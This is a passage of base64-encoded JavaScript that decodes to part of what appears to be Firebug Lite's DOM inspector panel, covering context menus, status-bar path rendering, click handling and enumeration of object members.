vZ2dsZXM6IHRoaXMudG9nZ2xlcywgc2Nyb2xsVG9wOiAwfV07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRoaXMucGF0aEluZGV4ID0gMTsNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5vYmplY3RQYXRoID0gW3dpbiwgb2JqZWN0XTsNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5wcm9wZXJ0eVBhdGggPSBbbnVsbCwgbnVsbF07DQogICAgICAgICAgICAgICAgICAgIHRoaXMudmlld1BhdGggPSBbDQogICAgICAgICAgICAgICAgICAgICAgICB7dG9nZ2xlczoge30sIHNjcm9sbFRvcDogMH0sDQogICAgICAgICAgICAgICAgICAgICAgICB7dG9nZ2xlczogdGhpcy50b2dnbGVzLCBzY3JvbGxUb3A6IDB9DQogICAgICAgICAgICAgICAgICAgIF07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB0aGlzLnBhbmVsTm9kZS5zY3JvbGxUb3AgPSAwOw0KICAgICAgICAgICAgdGhpcy5yZWJ1aWxkKCk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLnBhdGhJbmRleCA9IHBhdGhJbmRleDsNCg0KICAgICAgICAgICAgdmFyIHZpZXcgPSB0aGlzLnZpZXdQYXRoW3BhdGhJbmRleF07DQogICAgICAgICAgICB0aGlzLnRvZ2dsZXMgPSB2aWV3LnRvZ2dsZXM7DQoNCiAgICAgICAgICAgIC8vIFBlcnNpc3QgdGhlIGN1cnJlbnQgc2Nyb2xsIGxvY2F0aW9uDQogICAgICAgICAgICBpZiAocHJldmlvdXNWaWV3ICYmIHRoaXMucGFuZWxOb2RlLnNjcm9sbFRvcCkNCiAgICAgICAgICAgICAgICBwcmV2aW91c1ZpZXcuc2Nyb2xsVG9wID0gdGhpcy5wYW5lbE5vZGUuc2Nyb2xsVG9wOw0KDQogICAgICAgICAgICB0aGlzLnJlYnVpbGQoZmFsc2UsIHZpZXcuc2Nyb2xsVG9wKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBnZXRPYmplY3RQYXRoOiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICByZXR1cm4gdGhpcy5vYmplY3RQYXRoOw0KICAgIH0sDQoNCiAgICBnZXREZWZhdWx0U2VsZWN0aW9uOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICByZXR1cm4gRmlyZWJ1Zy5icm93c2VyLndpbmRvdzsNCiAgICAgICAgLy9yZXR1cm4gdGhpcy5jb250ZXh0LmdldEdsb2JhbFNjb3BlKCk7DQogICAgfS8qLA0KDQogICAgdXBkYXRlT3B0aW9uOiBmdW5jdGlvbihuYW1lLCB2YWx1ZSkNCiAgICB7DQogICAgICAgIGNvbnN0IG9wdGlvbk1hcCA9IHtzaG93VXNlclByb3BzOiAxLCBzaG93VXNlckZ1bmNzOiAxLCBzaG93RE9NUHJvcHM6IDEsDQogICAgICAgICAgICBzaG93RE9NRnVuY3M6IDEsIHNob3dET01Db25zdGFudHM6IDF9Ow0KICAgICAgICBpZiAoIG9wdGlvbk1hcC5oYXNPd25Qcm9wZXJ0eShuYW1lKSApDQogICAgICAgICAgICB0aGlzLnJlYnVpbGQodHJ1ZSk7DQogICAgfSwNCg0KICAgIGdldE9wdGlvbnNNZW51SXRlbXM6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiBbDQogICAgICAgICAgICBvcHRpb25NZW51KCJTaG93VXNlclByb3BzIiwgInNob3dVc2VyUHJvcHMiKSwNCiAgICAgICAgICAgIG9wdGlvbk1lbnUoIlNob3dVc2VyRnVuY3MiLCAic2hvd1VzZXJGdW5jcyIpLA0KICAgICAgICAgICAgb3B0aW9uTWVudSgiU2hvd0RPTVByb3BzIiwgInNob3dET01Qcm9wcyIpLA0KICAgICAgICAgICAgb3B0aW9uTWVudSgiU2hvd0RPTUZ1bmNzIiwgInNob3dET01GdW5jcyIpLA0KICAgICAgICAgICAgb3B0aW9uTWVudSgiU2hvd0RPTUNvbnN0YW50cyIsICJzaG93RE9NQ29uc3RhbnRzIiksDQogICAgICAgICAgICAiLSIsDQogICAgICAgICAgICB7bGFiZWw6ICJSZWZyZXNoIiwgY29tbWFuZDogYmluZEZpeGVkKHRoaXMucmVidWlsZCwgdGhpcywgdHJ1ZSkgfQ0KICAgICAgICBdOw0KICAgIH0sDQoNCiAgICBnZXRDb250ZXh0TWVudUl0ZW1zOiBmdW5jdGlvbihvYmplY3QsIHRhcmdldCkNCiAgICB7DQogICAgICAgIHZhciByb3cgPSBnZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAibWVtYmVyUm93Iik7DQoNCiAgICAgICAgdmFyIGl0ZW1zID0gW107DQoNCiAgICAgICAgaWYgKHJvdykNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHJvd05hbWUgPSBnZXRSb3dOYW1lKHJvdyk7DQogICAgICAgICAgICB2YXIgcm93T2JqZWN0ID0gdGhpcy5nZXRSb3dPYmplY3Qocm93KTsNCiAgICAgICAgICAgIHZhciByb3dWYWx1ZSA9IHRoaXMuZ2V0Um93UHJvcGVydHlWYWx1ZShyb3cpOw0KDQogICAgICAgICAgICB2YXIgaXNXYXRjaCA9IGhhc0NsYXNzKHJvdywgIndhdGNoUm93Iik7DQogICAgICAgICAgICB2YXIgaXNTdGFja0ZyYW1lID0gcm93T2JqZWN0IGluc3RhbmNlb2YganNkSVN0YWNrRnJhbWU7DQoNCiAgICAgICAgICAgIGlmICh0eXBlb2Yocm93VmFsdWUpID09ICJzdHJpbmciIHx8IHR5cGVvZihyb3dWYWx1ZSkgPT0gIm51bWJlciIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gRnVuY3Rpb25zIGFscmVhZHkgaGF2ZSBhIGNvcHkgaXRlbSBpbiB0aGVpciBjb250ZXh0IG1lbnUNCiAgICAgICAgICAgICAgICBpdGVtcy5wdXNoKA0KICAgICAgICAgICAgICAgICAgICAiLSIsDQogICAgICAgICAgICAgICAgICAgIHtsYWJlbDogIkNvcHlWYWx1ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiBiaW5kRml4ZWQodGhpcy5jb3B5UHJvcGVydHksIHRoaXMsIHJvdykgfQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGl0ZW1zLnB1c2goDQogICAgICAgICAgICAgICAgIi0iLA0KICAgICAgICAgICAgICAgIHtsYWJlbDogaXNXYXRjaCA/ICJFZGl0V2F0Y2giIDogKGlzU3RhY2tGcmFtZSA/ICJFZGl0VmFyaWFibGUiIDogIkVkaXRQcm9wZXJ0eSIpLA0KICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiBiaW5kRml4ZWQodGhpcy5lZGl0UHJvcGVydHksIHRoaXMsIHJvdykgfQ0KICAgICAgICAgICAgKTsNCg0KICAgICAgICAgICAgaWYgKGlzV2F0Y2ggfHwgKCFpc1N0YWNrRnJhbWUgJiYgIWlzRE9NTWVtYmVyKHJvd09iamVjdCwgcm93TmFtZSkpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGl0ZW1zLnB1c2goDQogICAgICAgICAgICAgICAgICAgIHtsYWJlbDogaXNXYXRjaCA/ICJEZWxldGVXYXRjaCIgOiAiRGVsZXRlUHJvcGVydHkiLA0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogYmluZEZpeGVkKHRoaXMuZGVsZXRlUHJvcGVydHksIHRoaXMsIHJvdykgfQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBpdGVtcy5wdXNoKA0KICAgICAgICAgICAgIi0iLA0KICAgICAgICAgICAge2xhYmVsOiAiUmVmcmVzaCIsIGNvbW1hbmQ6IGJpbmRGaXhlZCh0aGlzLnJlYnVpbGQsIHRoaXMsIHRydWUpIH0NCiAgICAgICAgKTsNCg0KICAgICAgICByZXR1cm4gaXRlbXM7DQogICAgfSwNCg0KICAgIGdldEVkaXRvcjogZnVuY3Rpb24odGFyZ2V0LCB2YWx1ZSkNCiAgICB7DQogICAgICAgIGlmICghdGhpcy5lZGl0b3IpDQogICAgICAgICAgICB0aGlzLmVkaXRvciA9IG5ldyBET01FZGl0b3IodGhpcy5kb2N1bWVudCk7DQoNCiAgICAgICAgcmV0dXJuIHRoaXMuZWRpdG9yOw0KICAgIH0vKiovDQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCi8vIFRPRE86IHh4eHBlZHJvIHN0YXR1c2Jhcg0KdmFyIHVwZGF0ZVN0YXR1c0JhciA9IGZ1bmN0aW9uKHBhbmVsKQ0Kew0KICAgIHZhciBwYXRoID0gcGFuZWwucHJvcGVydHlQYXRoOw0KICAgIHZhciBpbmRleCA9IHBhbmVsLnBhdGhJbmRleDsNCiAgICANCiAgICB2YXIgciA9IFtdOw0KICAgIA0KICAgIGZvciAodmFyIGk9MCwgbD1wYXRoLmxlbmd0aDsgaTxsOyBpKyspDQogICAgew0KICAgICAgICByLnB1c2goaT09aW5kZXggPyAnPGEgY2xhc3M9ImZiSG92ZXIgZmJCdXR0b24gZmJCdG5TZWxlY3RlZCIgJyA6ICc8YSBjbGFzcz0iZmJIb3ZlciBmYkJ1dHRvbiIgJyk7DQogICAgICAgIHIucHVzaCgncGF0aEluZGV4PScpOw0KICAgICAgICByLnB1c2goaSk7DQogICAgICAgIA0KICAgICAgICBpZihpc0lFNikNCiAgICAgICAgICAgIHIucHVzaCgnIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSInKTsNCiAgICAgICAgDQogICAgICAgIHIucHVzaCgnPicpOw0KICAgICAgICByLnB1c2goaT09MCA/ICJ3aW5kb3ciIDogcGF0aFtpXSB8fCAiT2JqZWN0Iik7DQogICAgICAgIHIucHVzaCgnPC9hPicpOw0KICAgICAgICANCiAgICAgICAgaWYoaSA8IGwtMSkNCiAgICAgICAgICAgIHIucHVzaCgnPHNwYW4gY2xhc3M9ImZiU3RhdHVzU2VwYXJhdG9yIj4mZ3Q7PC9zcGFuPicpOw0KICAgIH0NCiAgICBwYW5lbC5zdGF0dXNCYXJOb2RlLmlubmVySFRNTCA9IHIuam9pbigiIik7DQp9Ow0KDQoNCnZhciBET01NYWluUGFuZWwgPSBGaXJlYnVnLkRPTVBhbmVsID0gZnVuY3Rpb24gKCkge307DQoNCkZpcmVidWcuRE9NUGFuZWwuRGlyVGFibGUgPSBEaXJUYWJsZVBsYXRlOw0KDQpET01NYWluUGFuZWwucHJvdG90eXBlID0gZXh0ZW5kKEZpcmVidWcuRE9NQmFzZVBhbmVsLnByb3RvdHlwZSwNCnsNCiAgICBvbkNsaWNrU3RhdHVzQmFyOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIHZhciB0YXJnZXQgPSBldmVudC5zcmNFbGVtZW50IHx8IGV2ZW50LnRhcmdldDsNCiAgICAgICAgdmFyIGVsZW1lbnQgPSBnZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAiZmJIb3ZlciIpOw0KICAgICAgICANCiAgICAgICAgaWYoZWxlbWVudCkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHBhdGhJbmRleCA9IGVsZW1lbnQuZ2V0QXR0cmlidXRlKCJwYXRoSW5kZXgiKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYocGF0aEluZGV4KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRoaXMuc2VsZWN0KHRoaXMuZ2V0UGF0aE9iamVjdChwYXRoSW5kZXgpKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgc2VsZWN0Um93OiBmdW5jdGlvbihyb3csIHRhcmdldCkNCiAgICB7DQogICAgICAgIGlmICghdGFyZ2V0KQ0KICAgICAgICAgICAgdGFyZ2V0ID0gcm93Lmxhc3RDaGlsZC5maXJzdENoaWxkOw0KDQogICAgICAgIGlmICghdGFyZ2V0IHx8ICF0YXJnZXQucmVwT2JqZWN0KQ0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIHRoaXMucGF0aFRvQXBwZW5kID0gZ2V0UGF0aChyb3cpOw0KDQogICAgICAgIC8vIElmIHRoZSBvYmplY3QgaXMgaW5zaWRlIGFuIGFycmF5LCBsb29rIHVwIGl0cyBpbmRleA0KICAgICAgICB2YXIgdmFsdWVCb3ggPSByb3cubGFzdENoaWxkLmZpcnN0Q2hpbGQ7DQogICAgICAgIGlmIChoYXNDbGFzcyh2YWx1ZUJveCwgIm9iamVjdEJveC1hcnJheSIpKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgYXJyYXlJbmRleCA9IEZpcmVidWdSZXBzLkFyci5nZXRJdGVtSW5kZXgodGFyZ2V0KTsNCiAgICAgICAgICAgIHRoaXMucGF0aFRvQXBwZW5kLnB1c2goYXJyYXlJbmRleCk7DQogICAgICAgIH0NCg0KICAgICAgICAvLyBNYWtlIHN1cmUgd2UgZ2V0IGEgZnJlc2ggc3RhdHVzIHBhdGggZm9yIHRoZSBvYmplY3QsIHNpbmNlIG90aGVyd2lzZQ0KICAgICAgICAvLyBpdCBtaWdodCBmaW5kIHRoZSBvYmplY3QgaW4gdGhlIGV4aXN0aW5nIHBhdGggYW5kIG5vdCByZWZyZXNoIGl0DQogICAgICAgIC8vRmlyZWJ1Zy5jaHJvbWUuY2xlYXJTdGF0dXNQYXRoKCk7DQoNCiAgICAgICAgdGhpcy5zZWxlY3QodGFyZ2V0LnJlcE9iamVjdCwgdHJ1ZSk7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIG9uQ2xpY2s6IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgdmFyIHRhcmdldCA9IGV2ZW50LnNyY0VsZW1lbnQgfHwgZXZlbnQudGFyZ2V0Ow0KICAgICAgICB2YXIgcmVwTm9kZSA9IEZpcmVidWcuZ2V0UmVwTm9kZSh0YXJnZXQpOw0KICAgICAgICBpZiAocmVwTm9kZSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHJvdyA9IGdldEFuY2VzdG9yQnlDbGFzcyh0YXJnZXQsICJtZW1iZXJSb3ciKTsNCiAgICAgICAgICAgIGlmIChyb3cpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdGhpcy5zZWxlY3RSb3cocm93LCByZXBOb2RlKTsNCiAgICAgICAgICAgICAgICBjYW5jZWxFdmVudChldmVudCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vIGV4dGVuZHMgUGFuZWwNCg0KICAgIG5hbWU6ICJET00iLA0KICAgIHRpdGxlOiAiRE9NIiwNCiAgICBzZWFyY2hhYmxlOiB0cnVlLA0KICAgIHN0YXR1c1NlcGFyYXRvcjogIj4iLA0KICAgIA0KICAgIG9wdGlvbnM6IHsNCiAgICAgICAgaGFzVG9vbEJ1dHRvbnM6IHRydWUsDQogICAgICAgIGhhc1N0YXR1c0JhcjogdHJ1ZQ0KICAgIH0sICAgIA0KDQogICAgY3JlYXRlOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBGaXJlYnVnLkRPTUJhc2VQYW5lbC5wcm90b3R5cGUuY3JlYXRlLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7DQogICAgICAgIA0KICAgICAgICB0aGlzLm9uQ2xpY2sgPSBiaW5kKHRoaXMub25DbGljaywgdGhpcyk7DQogICAgICAgIA0KICAgICAgICAvL1RPRE86IHh4eHBlZHJvDQogICAgICAgIHRoaXMub25DbGlja1N0YXR1c0JhciA9IGJpbmQodGhpcy5vbkNsaWNrU3RhdHVzQmFyLCB0aGlzKTsNCiAgICAgICAgDQogICAgICAgIHRoaXMucGFuZWxOb2RlLnN0eWxlLnBhZGRpbmcgPSAiMCAxcHgiOw0KICAgIH0sDQoNCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbihvbGRQYW5lbE5vZGUpDQogICAgew0KICAgICAgICAvL3RoaXMucGFuZWxOb2RlLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgdGhpcy5vbkNsaWNrLCBmYWxzZSk7DQogICAgICAgIC8vZGlzcGF0Y2goW0ZpcmVidWcuQTExeU1vZGVsXSwgJ29uSW5pdGlhbGl6ZU5vZGUnLCBbdGhpcywgJ2NvbnNvbGUnXSk7DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLkRPTUJhc2VQYW5lbC5wcm90b3R5cGUuaW5pdGlhbGl6ZS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgICAgICANCiAgICAgICAgYWRkRXZlbnQodGhpcy5wYW5lbE5vZGUsICJjbGljayIsIHRoaXMub25DbGljayk7DQogICAgICAgIA0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBkb20gDQogICAgICAgIHRoaXMuaXNob3coKTsNCiAgICAgICAgDQogICAgICAgIC8vVE9ETzogeHh4cGVkcm8NCiAgICAgICAgYWRkRXZlbnQodGhpcy5zdGF0dXNCYXJOb2RlLCAiY2xpY2siLCB0aGlzLm9uQ2xpY2tTdGF0dXNCYXIpOyAgICAgICAgDQogICAgfSwNCg0KICAgIHNodXRkb3duOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICAvL3RoaXMucGFuZWxOb2RlLnJlbW92ZUV2ZW50TGlzdGVuZXIoImNsaWNrIiwgdGhpcy5vbkNsaWNrLCBmYWxzZSk7DQogICAgICAgIC8vZGlzcGF0Y2goW0ZpcmVidWcuQTExeU1vZGVsXSwgJ29uRGVzdHJveU5vZGUnLCBbdGhpcywgJ2NvbnNvbGUnXSk7DQogICAgICAgIA0KICAgICAgICByZW1vdmVFdmVudCh0aGlzLnBhbmVsTm9kZSwgImNsaWNrIiwgdGhpcy5vbkNsaWNrKTsNCiAgICAgICAgDQogICAgICAgIEZpcmVidWcuRE9NQmFzZVBhbmVsLnByb3RvdHlwZS5zaHV0ZG93bi5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgIH0vKiwNCg0KICAgIHNlYXJjaDogZnVuY3Rpb24odGV4dCwgcmV2ZXJzZSkNCiAgICB7DQogICAgICAgIGlmICghdGV4dCkNCiAgICAgICAgew0KICAgICAgICAgICAgZGVsZXRlIHRoaXMuY3VycmVudFNlYXJjaDsNCiAgICAgICAgICAgIHRoaXMuaGlnaGxpZ2h0Um93KG51bGwpOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIHJvdzsNCiAgICAgICAgaWYgKHRoaXMuY3VycmVudFNlYXJjaCAmJiB0ZXh0ID09IHRoaXMuY3VycmVudFNlYXJjaC50ZXh0KQ0KICAgICAgICAgICAgcm93ID0gdGhpcy5jdXJyZW50U2VhcmNoLmZpbmROZXh0KHRydWUsIHVuZGVmaW5lZCwgcmV2ZXJzZSwgRmlyZWJ1Zy5zZWFyY2hDYXNlU2Vuc2l0aXZlKTsNCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBmdW5jdGlvbiBmaW5kUm93KG5vZGUpIHsgcmV0dXJuIGdldEFuY2VzdG9yQnlDbGFzcyhub2RlLCAibWVtYmVyUm93Iik7IH0NCiAgICAgICAgICAgIHRoaXMuY3VycmVudFNlYXJjaCA9IG5ldyBUZXh0U2VhcmNoKHRoaXMucGFuZWxOb2RlLCBmaW5kUm93KTsNCiAgICAgICAgICAgIHJvdyA9IHRoaXMuY3VycmVudFNlYXJjaC5maW5kKHRleHQsIHJldmVyc2UsIEZpcmVidWcuc2VhcmNoQ2FzZVNlbnNpdGl2ZSk7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAocm93KQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgc2VsID0gdGhpcy5kb2N1bWVudC5kZWZhdWx0Vmlldy5nZXRTZWxlY3Rpb24oKTsNCiAgICAgICAgICAgIHNlbC5yZW1vdmVBbGxSYW5nZXMoKTsNCiAgICAgICAgICAgIHNlbC5hZGRSYW5nZSh0aGlzLmN1cnJlbnRTZWFyY2gucmFuZ2UpOw0KDQogICAgICAgICAgICBzY3JvbGxJbnRvQ2VudGVyVmlldyhyb3csIHRoaXMucGFuZWxOb2RlKTsNCg0KICAgICAgICAgICAgdGhpcy5oaWdobGlnaHRSb3cocm93KTsNCiAgICAgICAgICAgIGRpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbkRvbVNlYXJjaE1hdGNoRm91bmQnLCBbdGhpcywgdGV4dCwgcm93XSk7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIGRpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbkRvbVNlYXJjaE1hdGNoRm91bmQnLCBbdGhpcywgdGV4dCwgbnVsbF0pOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfS8qKi8NCn0pOw0KDQpGaXJlYnVnLnJlZ2lzdGVyUGFuZWwoRE9NTWFpblBhbmVsKTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gTG9jYWwgSGVscGVycw0KDQp2YXIgZ2V0TWVtYmVycyA9IGZ1bmN0aW9uIGdldE1lbWJlcnMob2JqZWN0LCBsZXZlbCkgIC8vIHdlIGV4cGVjdCBvYmplY3QgdG8gYmUgdXNlci1sZXZlbCBvYmplY3Qgd3JhcHBlZCBpbiBzZWN1cml0eSBibGFua2V0DQp7DQogICAgaWYgKCFsZXZlbCkNCiAgICAgICAgbGV2ZWwgPSAwOw0KDQogICAgdmFyIG9yZGluYWxzID0gW10sIHVzZXJQcm9wcyA9IFtdLCB1c2VyQ2xhc3NlcyA9IFtdLCB1c2VyRnVuY3MgPSBbXSwNCiAgICAgICAgZG9tUHJvcHMgPSBbXSwgZG9tRnVuY3MgPSBbXSwgZG9tQ29uc3RhbnRzID0gW107DQoNCiAgICB0cnkNCiAgICB7DQogICAgICAgIHZhciBkb21NZW1iZXJzID0gZ2V0RE9NTWVtYmVycyhvYmplY3QpOw0KICAgICAgICAvL3ZhciBkb21NZW1iZXJzID0ge307IC8vIFRPRE86IHh4eHBlZHJvDQogICAgICAgIC8vdmFyIGRvbUNvbnN0YW50TWFwID0ge307ICAvLyBUT0RPOiB4eHhwZWRybw0KDQogICAgICAgIGlmIChvYmplY3Qud3JhcHBlZEpTT2JqZWN0KQ0KICAgICAgICAgICAgdmFyIGluc2VjdXJlT2JqZWN0ID0gb2JqZWN0LndyYXBwZWRKU09iamVjdDsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgdmFyIGluc2VjdXJlT2JqZWN0ID0gb2JqZWN0Ow0KDQogICAgICAgIC8vIElFIGZ1bmN0aW9uIHByb3RvdHlwZSBpcyBub3QgbGlzdGVkIGluIChmb3IuLmluKQ0KICAgICAgICBpZiAoaXNJRSAmJiBpc0Z1bmN0aW9uKG9iamVjdCkpDQogICAgICAgICAgICBhZGRNZW1iZXIoInVzZXIiLCB1c2VyUHJvcHMsICJwcm90b3R5cGUiLCBvYmplY3QucHJvdG90eXBlLCBsZXZlbCk7ICAgICAgICAgICAgDQogICAgICAgICAgICANCiAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBpbnNlY3VyZU9iamVjdCkgIC8vIGVudW1lcmF0aW9uIGlzIHNhZmUNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKGlnbm9yZVZhcnNbbmFtZV0gPT0gMSkgIC8vIGphdmFzY3JpcHQub3B0aW9ucy5zdHJpY3Qgc2F5cyBpZ25vcmVWYXJzIGlzIHVuZGVmaW5lZC4NCiAgICAgICAgICAgICAgICBjb250aW51ZTsNCg0KICAgICAgICAgICAgdmFyIHZhbDsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhbCA9IGluc2VjdXJlT2JqZWN0W25hbWVdOyAgLy8gZ2V0dGVyIGlzIHNhZmUNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIChleGMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gU29tZXRpbWVzIHdlIGdldCBleGNlcHRpb25zIHRyeWluZyB0byBhY2Nlc3MgY2VydGFpbiBtZW1iZXJzDQogICAgICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0VSUk9SUyAmJiBGQlRyYWNlLkRCR19ET00pDQogICAgICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJkb20uZ2V0TWVtYmVycyBjYW5ub3QgYWNjZXNzICIrbmFtZSwgZXhjKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgdmFyIG9yZGluYWwgPSBwYXJzZUludChuYW1lKTsNCiAgICAgICAgICAgIGlmIChvcmRpbmFsIHx8IG9yZGluYWwgPT0gMCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBhZGRNZW1iZXIoIm9yZGluYWwiLCBvcmRpbmFscywgbmFtZSwgdmFsLCBsZXZlbCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmIChpc0Z1bmN0aW9uKHZhbCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKGlzQ2xhc3NGdW5jdGlvbih2YWwpICYmICEobmFtZSBpbiBkb21NZW1iZXJzKSkNCiAgICAgICAgICAgICAgICAgICAgYWRkTWVtYmVyKCJ1c2VyQ2xhc3MiLCB1c2VyQ2xhc3NlcywgbmFtZSwgdmFsLCBsZXZlbCk7DQogICAgICAgICAgICAgICAgZWxzZSBpZiAobmFtZSBpbiBkb21NZW1iZXJzKQ0KICAgICAgICAgICAgICAgICAgICBhZGRNZW1iZXIoImRvbUZ1bmN0aW9uIiwgZG9tRnVuY3MsIG5hbWUsIHZhbCwgbGV2ZWwsIGRvbU1lbWJlcnNbbmFtZV0pOw0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgYWRkTWVtYmVyKCJ1c2VyRnVuY3Rpb24iLCB1c2VyRnVuY3MsIG5hbWUsIHZhbCwgbGV2ZWwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vVE9ETzogeHh4cGVkcm8NCiAgICAgICAgICAgICAgICAvKg0KICAgICAgICAgICAgICAgIHZhciBnZXR0ZXJGdW5jdGlvbiA9IGluc2VjdXJlT2JqZWN0Ll9fbG9va3VwR2V0dGVyX18obmFtZSksDQogICAgICAgICAgICAgICAgICAgIHNldHRlckZ1bmN0aW9uID0gaW5zZWN1cmVPYmplY3QuX19sb29rdXBTZXR0ZXJfXyhuYW1lKSwNCiAgICAgICAgICAgICAgICAgICAgcHJlZml4ID0gIiI7DQoNCiAgICAgICAgICAgICAgICBpZihnZXR0ZXJGdW5jdGlvbiAmJiAhc2V0dGVyRnVuY3Rpb24pDQogICAgICAgICAgICAgICAgICAgIHByZWZpeCA9ICJnZXQgIjsNCiAgICAgICAgICAgICAgICAvKiovDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdmFyIHByZWZpeCA9ICIiOw0KDQogICAgICAgICAgICAgICAgaWYgKG5hbWUgaW4gZG9tTWVtYmVycyAmJiAhKG5hbWUgaW4gZG9tQ29uc3RhbnRNYXApKQ0KICAgICAgICAgICAgICAgICAgICBhZGRNZW1iZXIoImRvbSIsIGRvbVByb3BzLCAocHJlZml4K25hbWUpLCB2YWwsIGxldmVsLCBkb21NZW1iZXJzW25hbWVdKTsNCiAgICAgICAgICAgICAgICBlbHNlIGlmIChuYW1lIGluIGRvbUNvbnN0YW50TWFwKQ0KICAgICAgICAgICAgICAgICAgICBhZGRNZW1iZXIoImRvbSIsIGRvbUNvbnN0YW50cywgKHByZWZpeCtuYW1lKSwgdmFsLCBsZXZlbCk7DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICBhZGRNZW1iZXIoInVzZXIiLCB1c2VyUHJvcHMsIChwcmVmaXgrbmFtZSksIHZhbCwgbGV2ZWwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIChleGMpDQogICAgew0KICAgICAgICAvLyBTb21ldGltZXMgd2UgZ2V0IGV4Y2VwdGlvbnMganVzd